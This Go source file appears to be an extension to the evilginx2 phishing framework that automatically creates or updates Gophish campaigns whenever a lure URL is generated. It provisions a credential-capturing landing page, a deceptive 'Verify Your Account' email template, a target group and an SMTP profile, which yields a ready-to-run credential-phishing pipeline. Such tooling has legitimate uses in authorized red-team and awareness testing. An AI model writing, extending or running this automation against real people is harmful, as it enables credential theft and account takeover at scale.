package core

import (
	"fmt"
	"strings"

	"github.com/kgretzky/evilginx2/log"
	gp_models "github.com/kgretzky/evilginx2/gophish/models"
)

const autoUID int64 = 1

// AutomateCampaignFromLure automatically updates or creates a Gophish campaign
// when a lure URL is generated in Evilginx. Everything is auto-provisioned:
// landing page, email template, placeholder group, and placeholder SMTP.
func AutomateCampaignFromLure(baseUrl string, phishletName string, cfg *Config) {
	summary, err := gp_models.GetCampaignSummaries(autoUID)
	if err != nil {
		log.Error("automation: failed to get gophish campaigns: %v", err)
		return
	}

	found := false
	for _, cs := range summary.Campaigns {
		if strings.Contains(strings.ToLower(cs.Name), strings.ToLower(phishletName)) {
			c, err := gp_models.GetCampaign(cs.Id, autoUID)
			if err != nil {
				log.Error("automation: failed to get campaign %d: %v", cs.Id, err)
				continue
			}
			if c.URL != baseUrl {
				log.Info("automation: updating campaign '%s' URL → %s", c.Name, baseUrl)
				c.URL = baseUrl
				if err := gp_models.UpdateCampaign(&c); err != nil {
					log.Error("automation: failed to update campaign %d: %v", cs.Id, err)
				}
			}
			found = true
		}
	}

	if !found {
		if err := autoCreateCampaign(baseUrl, phishletName); err != nil {
			log.Warning("automation: %v", err)
		}
	}
}

// ensureGroup returns the first existing group or creates a placeholder.
func ensureGroup() (string, error) {
	groups, err := gp_models.GetGroups(autoUID)
	if err == nil && len(groups) > 0 {
		return groups[0].Name, nil
	}

	g := gp_models.Group{
		Name:   "evilginx-default",
		UserId: autoUID,
		Targets: []gp_models.Target{
			{BaseRecipient: gp_models.BaseRecipient{
				Email:     "target@example.com",
				FirstName: "Target",
				LastName:  "User",
			}},
		},
	}
	if err := gp_models.PostGroup(&g); err != nil {
		return "", fmt.Errorf("auto-create group: %v", err)
	}
	log.Info("automation: created placeholder group 'evilginx-default'")
	return g.Name, nil
}

// ensureSMTP returns the first existing SMTP profile or creates a placeholder.
func ensureSMTP() (string, error) {
	smtps, err := gp_models.GetSMTPs(autoUID)
	if err == nil && len(smtps) > 0 {
		return smtps[0].Name, nil
	}

	s := gp_models.SMTP{
		Name:             "evilginx-default",
		UserId:           autoUID,
		Host:             "localhost:25",
		FromAddress:      "noreply@example.com",
		IgnoreCertErrors: true,
	}
	if err := gp_models.PostSMTP(&s); err != nil {
		return "", fmt.Errorf("auto-create smtp: %v", err)
	}
	log.Info("automation: created placeholder SMTP 'evilginx-default'")
	return s.Name, nil
}

// ensurePage returns an existing page for the phishlet or creates one.
func ensurePage(phishletName string, baseUrl string) (string, error) {
	pageName := fmt.Sprintf("evilginx-%s", phishletName)
	_, err := gp_models.GetPageByName(pageName, autoUID)
	if err == nil {
		return pageName, nil
	}

	p := gp_models.Page{
		Name:               pageName,
		UserId:             autoUID,
		HTML:               fmt.Sprintf(`<html><head><meta http-equiv="refresh" content="0; url=%s"></head><body>Redirecting...</body></html>`, baseUrl),
		CaptureCredentials: true,
		CapturePasswords:   true,
		RedirectURL:        baseUrl,
	}
	if err := gp_models.PostPage(&p); err != nil {
		return "", fmt.Errorf("auto-create page: %v", err)
	}
	log.Info("automation: created landing page '%s'", pageName)
	return pageName, nil
}

// ensureTemplate returns an existing template for the phishlet or creates one.
func ensureTemplate(phishletName string) (string, error) {
	templName := fmt.Sprintf("evilginx-%s", phishletName)
	_, err := gp_models.GetTemplateByName(templName, autoUID)
	if err == nil {
		return templName, nil
	}

	t := gp_models.Template{
		Name:    templName,
		UserId:  autoUID,
		Subject: "Action Required - Verify Your Account",
		HTML:    `<html><body><p>Hello {{.FirstName}},</p><p>Please verify your account by clicking the link below:</p><p><a href="{{.URL}}">Verify Now</a></p><p>Thank you.</p></body></html>`,
		Text:    "Hello {{.FirstName}},\n\nPlease verify your account: {{.URL}}\n\nThank you.",
	}
	if err := gp_models.PostTemplate(&t); err != nil {
		return "", fmt.Errorf("auto-create template: %v", err)
	}
	log.Info("automation: created email template '%s'", templName)
	return templName, nil
}

// autoCreateCampaign creates a full GoPhish campaign from scratch.
// All resources (group, SMTP, page, template) are auto-provisioned.
func autoCreateCampaign(baseUrl string, phishletName string) error {
	groupName, err := ensureGroup()
	if err != nil {
		return err
	}
	smtpName, err := ensureSMTP()
	if err != nil {
		return err
	}
	pageName, err := ensurePage(phishletName, baseUrl)
	if err != nil {
		return err
	}
	templName, err := ensureTemplate(phishletName)
	if err != nil {
		return err
	}

	campaignName := fmt.Sprintf("%s-auto", phishletName)
	c := gp_models.Campaign{
		Name:     campaignName,
		Template: gp_models.Template{Name: templName},
		Page:     gp_models.Page{Name: pageName},
		SMTP:     gp_models.SMTP{Name: smtpName},
		Groups:   []gp_models.Group{{Name: groupName}},
		URL:      baseUrl,
	}
	if err := gp_models.PostCampaign(&c, autoUID); err != nil {
		return fmt.Errorf("auto-create campaign: %v", err)
	}

	log.Success("automation: created gophish campaign '%s' (id: %d) → %s", campaignName, c.Id, baseUrl)
	return nil
}
